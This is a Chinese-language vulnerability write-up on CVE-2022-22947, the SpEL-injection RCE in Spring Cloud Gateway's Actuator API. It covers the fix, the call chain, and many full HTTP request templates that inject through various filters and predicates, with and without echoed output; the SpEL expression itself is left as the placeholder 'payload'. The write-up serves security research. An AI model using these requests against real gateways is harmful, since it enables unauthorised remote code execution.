一、前言
====

拜读且听安全公号的CVE-2022-22947分析，尝试复现过程中，有一些新的发现。个人技术有限，提供一些思路，如有问题，欢迎指出。

二、漏洞简述
======

基于Spring5.0+SpringBoot2.0+WebFlux（Reactor模式响应式通信）  
远程代码执行漏洞（CVE-2022-22947）发生在 Actuator API。

2.1 前置知识
--------

关键类

![2.1.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-51407b054fbbe69f8c97531cb449e1690642c8a0.png)

2.2 漏洞原理
--------

spring-cloud-gateway 在初次启动或者是刷新路由时，会重新把路由信息解析存储到缓存中。在解析路由 args 参数时，会用 Spel 解析器去解析 args 参数值。  
通过 Actuator API 中存储自定义路由信息接口，在 args 参数中存入恶意 spel 表达式，再次调用 Actuator中的刷新路由接口，使 spring-cloud-gateway 解析执行从而造成RCE。

三、漏洞修复
======

2月9号提交修改  
<https://github.com/spring-cloud/spring-cloud-gateway/commit/d8c255eddf4eb5f80ba027329227b0d9e2cd9698>  
`ShortcutConfigurable`更新使用自定义的`EvaluationContext`  
即：`StandardEvaluationContext`替换成了 `SimpleEvaluationContext`限制了 Spel 表达式解析。

![3.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5166c5d97c574355ee72884637e926de9ee91614.png)

四、分析调用链
=======

定位到修复的类`ShortcutConfigurable`，修改的地方在`getValue`方法体内部。  
我们选中该方法， Idea 快捷键`Ctrl + Alt + H`来查看调用的层次。经过哪些类的方法流转。

![4.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-b475a203a2e2bc4a8712787507c2edc49936ad5a.png)

调链在 RouteDefinitionRouteLocator 类分离出两条链。

- 一条是走 loadGatewayFilters 方法，是处理 GatewayFilter
- 一条是走 lookup 方法，是处理 RoutePredicate

**这也就为新的链提供了思路，猜测不光会有 filters 的利用链，也应该有 predicates 利用链。**

五、构造利用链
=======

5.1 无回显利用链
----------

### 5.1.1 filters 利用链的思考

这条链也是大多使用的链。之前看到文章说只有 `AddResponseHeader`过滤器能用，但是现在看到`Retry`过滤器也能用，让我多了一些想法。

```http
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 335

{
    "id": "first_route",
    "predicates": [],
    "filters": [{
        "name": "Retry",
        "args": 
            {
                "name": "payload",
                "value": "123"
            }
    }],
    "uri": "https://www.uri-destination.org",
    "order": 0
}
```

通过路由匹配 args 参数来执行 RCE。将 args 参数中的 `payload`替换成 spel 表达式。  
刷新路由，触发RCE。

![5.1.1.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-39f42b2adf811482af88b074c49a8ffbcfc4c18a.png)

**不得不产生疑问了，真的是只有**`AddResponseHeader`**和**`Retry`**过滤器才能用？不能有其他的过滤器？**

#### 1. 研究限制点：

spring-cloud-gateway 在保存路由定义信息时，会进行校验，校验 filters 的 name 参数，是否与内置的工厂名字相同。也就是在前置知识中路由信息类提到的各种工厂名称。

```java
// 校验路由匹配信息 name 
private boolean isAvailable(FilterDefinition filterDefinition) {
    return GatewayFilters.stream()
            .anyMatch(gatewayFilterFactory -> filterDefinition.getName().equals(gatewayFilterFactory.name()));
}
```

梳理出了所有**合法过滤器名称**。

```txt
AddRequestHeader
MapRequestHeader
AddRequestParameter
AddResponseHeader
ModifyRequestBody
DedupeResponseHeader
ModifyResponseBody
CacheRequestBody
PrefixPath
PreserveHostHeader
RedirectTo
RemoveRequestHeader
RemoveRequestParameter
RemoveResponseHeader
RewritePath
Retry
SetPath
SecureHeaders
SetRequestHeader
SetRequestHostHeader
SetResponseHeader
RewriteResponseHeader
RewriteLocationResponseHeader
SetStatus
SaveSession
StripPrefix
RequestHeaderToRequestUri
RequestSize
RequestHeaderSize
```

#### 2. 新的思路

通过对限制点的思考，只要过滤器名称能绕过限制，理论上所有过滤器都可是行的。

这里随便试一下，更改过滤器`name`参数 为`SetStatus`过滤器。

```http
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 331

{
    "id": "first_route",
    "predicates": [],
    "filters": [{
        "name": "SetStatus",
        "args": 
            {
                "name": "payload",
                "value": "123"
            }
    }],
    "uri": "https://www.uri-destination.org",
    "order": 0
}
```

刷新路由，是能触发 RCE。

![5.1.1.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-39f42b2adf811482af88b074c49a8ffbcfc4c18a.png)

#### 3. 小结

无回显链，只要 FIlter 名字合法绕过限制，就能触发RCE。

### 5.1.2 predicates 利用链

在分析调用链的时候，猜测应该还有一条链。马上根据官网提示，创建路由 <https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#creating-and-deleting-a-particular-route>写个测试下。

```http
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json

{
  "id": "first_route",
  "predicates": [{
    "name": "Path",
    "args": {"_genkey_0":"payload"}
  }],
  "filters": [],
  "uri": "https://www.uri-destination.org",
  "order": 0
}
```

刷新路由，是能触发 RCE。

![5.1.1.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-39f42b2adf811482af88b074c49a8ffbcfc4c18a.png)

#### 1. 研究限制点：

和 filters 限制类似。spring-cloud-gateway 在保存路由定义信息时，校验 predicates 的 name 参数，是否与内置的工厂名字相同。也就是在前置知识中路由信息类提到的各种工厂名称。

```java
// 校验路由匹配信息 name 
private boolean isAvailable(PredicateDefinition predicateDefinition) {
    return routePredicates.stream()
            .anyMatch(routePredicate -> predicateDefinition.getName().equals(routePredicate.name()));
}
```

同样梳理出了所有合法过滤器名称。

```txt
After
Before
Between
Cookie
Header
Host
Method
Path
Query
ReadBody
RemoteAddr
Weight
CloudFoundryRouteService
```

那上面小结的结论是否同样适用 predicates 呢？

这里随便试一下，更改过滤器`name`参数为`Method`匹配器。

```http
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json

{
  "id": "first_route",
  "predicates": [{
    "name": "Method",
    "args": {"_genkey_0":"payload"}
  }],
  "filters": [],
  "uri": "https://www.uri-destination.org",
  "order": 0
}
```

刷新路由，果然触发 RCE。

![5.1.2.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-1da0bd87a26f825ffa1369764ebcafd5674bcd6d.png)

#### 2. 小结

无回显链 predicates 链确实存在，且只要 Predicates 名字合法绕过限制，就能触发RCE。

5.2 有回显利用链
----------

### 5.2.1 回显原理

用户存储的路由定义信息存在内存中，刷新路由 spel 表达式执行后，会把执行结果写入路由信息里面。  
通过查看路由信息 API 接口，就在路由信息展示中查看到 RCE 执行结果。

### 5.2.2 filters 回显链的思考

```http
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 335

{
    "id": "first_route",
    "predicates": [],
    "filters": [{
        "name": "AddRequestHeader",
        "args": 
            {
                "name": "Result",
                "value": "payload"
            }
    }],
    "uri": "https://www.uri-destination.org",
    "order": 0
}
```

**同样的只有**`AddResponseHeader`**过滤器能用？**

#### 1. 变种尝试

根据前面的小结，我们随手试一个合法过滤器 `RedirectTo`

```http
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 335

{
    "id": "first_route",
    "predicates": [],
    "filters": [{
        "name": "RedirectTo",
        "args": 
            {
                "name": "Result",
                "value": "payload"
            }
    }],
    "uri": "https://www.uri-destination.org",
    "order": 0
}
```

发现回显并不成功。

![5.2.2.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-6a8f5da9a6f59a25258cf4559c4d4cf2bfcf9396.png)

并且后台返回了个 `java.lang.NullPointerException: null`异常。

花了两秒钟思考，问题是出在了 arg参数解析上。为了验证我的判断去官网查看`RedirectTo`的参数配置。  
<https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#the-redirectto-gatewayfilter-factory>

> The RedirectTo GatewayFilter factory takes two parameters, status and url.The status parameter should be a 300 series redirect HTTP code, such as 301. The url parameter should be a valid URL. This is the value of the Location header.

可以看到确实只有连个参数 `status`和 `url`，修改我们的请求包。

```http
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 335

{
    "id": "first_route",
    "predicates": [],
    "filters": [{
        "name": "RedirectTo",
        "args": 
            {
                "status": "302",
                "url": "payload"
            }
    }],
    "uri": "https://www.uri-destination.org",
    "order": 0
}
```

![5.2.2.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-6a8f5da9a6f59a25258cf4559c4d4cf2bfcf9396.png)

但是也没回显，后台返回了异常。不是上面空指针异常，说明验证了参数的限制。

> java.lang.IllegalArgumentException: Illegal character in path at index 5: xxxx  
> at java.net.URI.create

通过看异常信息，说明 spring-cloud-gateway 是对 url 格式进行解析了。

也就是说相应的参数都有类型限制，比如 status 必须是 HTTP 状态码（枚举类型）。

我们需要另求突破点，找一个参数是 String 类型。

#### 2. 挖掘思路

从官网上找 Filter 必须给出了具体参数，且类型是字符串类型的参数 。

按照这个思路随手找了个合法 `RemoveRequestHeader`过滤器，发现只有一个 `name`参数。  
<https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#the-removerequestheader-gatewayfilter-factory>

> The RemoveResponseHeader GatewayFilter factory takes a **name** parameter. It is the name of the header to be removed.

```http
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 335

{
    "id": "first_route",
    "predicates": [],
    "filters": [{
        "name": "RemoveRequestHeader",
        "args": 
            {
                "name": "payload"
            }
    }],
    "uri": "https://www.uri-destination.org",
    "order": 0
}
```

![5.2.2-2.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-222de0aafd799346b0f0575b06c3d3b9f604189b.png)  
顺利执行成功。满足条件的过滤器还有很多，这里就不多测试了。

#### 3. 小结

回显链不光对`args`参数名称有限制，并且对参数对应的类型也有限制。

### 5.2.3 predicates 回显链

有了前面的经验，那这个匹配回显链就不在话下，花了3分钟调试出结果。

#### 1. 挖掘思路

从官网上找 predicates 必须给出了具体参数，且类型是字符串类型的参数 。

按照这个思路随手找了个合法 `Cookie`匹配器，有`name`和`regexp`参数。

```http
POST /actuator/gateway/routes/123456 HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 380

{
    "id": "first_route",
    "predicates": [{
        "name": "Cookie",
        "args": {
            "name": "payload",
            "regexp": "ch.p"
        }
    }],
    "filters": [],
    "uri": "https://www.uri-destination.org",
    "order": 0
}
```

![5.2.3.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-f613f6f13ae9ba43ee7666b4f5e682f0d2f16987.png)

可以看到顺利执行成功命令。同样满足条件的匹配器还有很多，这里就不多测试了。

#### 2. 小结

predicates回显链确实存在，不光对`args`参数名称有限制，并且对参数对应的类型也有限制。同时还有对参数完整行也有限制。  
如果不信邪，读者可以自己尝试将上面`Cookie`匹配器的 `regexp`参数去掉试试哈哈。

六、总结
====

站在巨人的肩膀上，多了很多启发，延展开了一些思考。在利用链调试过程中官网的操作手册也不失为一个很好的参考工具。

七、参考
====

- [https://mp.weixin.qq.com/s/lKKOUvWqU1Qpexus5u\_3Uw](https://mp.weixin.qq.com/s/lKKOUvWqU1Qpexus5u_3Uw)
- <https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/#gateway-starter>